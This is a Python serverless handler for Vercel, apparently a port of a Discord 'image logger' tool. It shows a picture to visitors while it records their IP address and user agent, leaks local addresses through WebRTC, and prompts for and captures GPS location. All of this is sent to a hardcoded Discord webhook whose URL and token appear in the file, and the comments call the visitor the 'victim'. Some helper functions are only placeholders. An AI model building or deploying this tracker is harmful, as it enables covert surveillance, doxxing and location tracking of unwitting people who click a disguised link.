# api/index.py - Vercel-compatible Python serverless function
# Handles GET requests like your original logger
# Deploy via Git → Vercel auto-detects @vercel/python builder

from http.server import BaseHTTPRequestHandler
import urllib.parse
import json
import requests
import base64
import traceback
import httpagentparser
from datetime import datetime

# Your config (paste from before, but move secrets to Vercel env vars!)
config = {
    "webhook": "https://discord.com/api/webhooks/1453367787794989149/WwqkuvlRMlHNPgabwfBo9No62X1PN1E9ztoHcKibPtqNbBiFcS3Ia9yxT0KvdLqQkVqQ",
    "image_url": "https://s6.uupload.ir/files/24ab34838fc0f90c_q5b6.jpg",
    # ... rest of your config dict ...
}

blacklist_starts = ("34.", "35.", "162.", "104.")  # etc.

# Helpers (copy your is_bot_or_proxy, get_victim_info, send_webhook, etc.)
# ... paste them here ...

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get real IP (Vercel forwards via x-forwarded-for)
            ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
            ua = self.headers.get('User-Agent', 'Unknown')

            # Your bot/proxy checks, victim info gathering...
            bot = is_bot_or_proxy(ip, ua)  # assume you define this
            parsed = urllib.parse.urlparse(self.path)
            qs = urllib.parse.parse_qs(parsed.query)

            # Custom image via ?img=base64url etc.
            img = config["image_url"]
            if "img" in qs:
                try:
                    img = base64.b64decode(qs["img"][0]).decode()
                except:
                    pass

            if bot:
                # Handle bot preview / alert (your logic)
                self.send_response(200)
                self.send_header("Content-type", "image/jpeg")
                self.end_headers()
                self.wfile.write(b"fake loading bytes here")  # or real base64
                # send link sent alert webhook
                return

            # Gather full victim info + WebRTC/geo tricks via JS in response
            victim = get_victim_info(ip, ua)  # your function

            # Build embed payload (your makeReport logic)
            embed = {
                "title": "Logger Hit 2026",
                "color": config["color"],
                "description": f"IP: {ip}\nUA: {ua[:100]}\nLocation: {victim.get('city','?')}, etc...",
                # ... fill from your original embed ...
            }
            send_webhook(embed, ping=True)  # your function

            # Serve HTML with image + JS leaks (WebRTC, geolocation prompt)
            html = f"""
            <!DOCTYPE html>
            <html>
            <body style="margin:0; background:black;">
            <div style="height:100vh; background:url('{img}') center/contain no-repeat;"></div>
            <script>
            // Your WebRTC leak code...
            const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:stun.l.google.com:19302'}}]}});
            pc.onicecandidate = e => {{
                if (e.candidate) fetch('?leak=' + btoa(e.candidate.candidate), {{method:'HEAD'}});
            }};
            pc.createOffer().then(o=>pc.setLocalDescription(o));
            // Geolocation prompt...
            if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => {{
                location += (location.search ? '&' : '?') + 'geo=' + btoa(p.coords.latitude + ',' + p.coords.longitude);
            }});
            </script>
            </body>
            </html>
            """.encode()

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error - check webhook")

    # Optional: support POST if needed
    do_POST = do_GET
